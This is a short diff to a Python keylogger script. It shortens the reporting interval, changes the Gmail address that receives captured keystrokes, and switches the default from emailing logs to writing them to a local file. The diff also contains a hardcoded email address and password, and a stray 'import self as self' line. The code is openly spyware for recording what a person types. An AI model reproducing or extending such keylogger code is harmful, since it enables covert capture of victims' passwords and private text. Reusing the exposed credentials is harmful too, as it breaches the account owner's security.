@@ -6,13 +6,13 @@ from datetime import datetime
 # initializing parameters
 import self as self
 
-SEND_REPORT_EVERY = 90  # seconds
-EMAIL_ADDRESS = "pythonkeylogger@gmail.com"
+SEND_REPORT_EVERY = 15  # seconds
+EMAIL_ADDRESS = "pythonkeylogger21@gmail.com"
 EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"
 
 
 class KeyLogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="file"):
         self.interval = interval  # time between every report, defined by SEND_REPORT_EVERY
         self.report_method = report_method
         self.log = ""  # keystrokes stored here
@@ -90,7 +90,7 @@ class KeyLogger:
 
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want the log to be recrd to a local file
-    # keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
